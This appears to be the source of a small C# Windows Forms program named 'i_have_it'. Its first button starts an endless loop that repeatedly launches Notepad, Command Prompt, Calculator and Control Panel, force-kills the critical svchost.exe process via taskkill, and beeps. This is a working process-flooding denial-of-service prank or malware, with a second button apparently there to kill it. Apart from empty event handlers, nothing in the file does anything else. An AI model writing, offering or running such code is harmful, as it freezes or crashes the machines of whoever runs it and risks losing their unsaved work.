using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.NetworkInformation;
using System.Media;

namespace i_have_it
{
    public partial class window : Form
    {
        public window()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void pictureBox1_Click_1(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
         while (true)
            {

                  Process.Start("notepad");
                  Process.Start("cmd");
                  Process.Start("calc");
                  Process.Start("control");
                  Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");
                SystemSounds.Beep.Play();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            foreach (var process in Process.GetProcessesByName("i have it"))
            {
                process.Kill();
            }
        }
    }
}
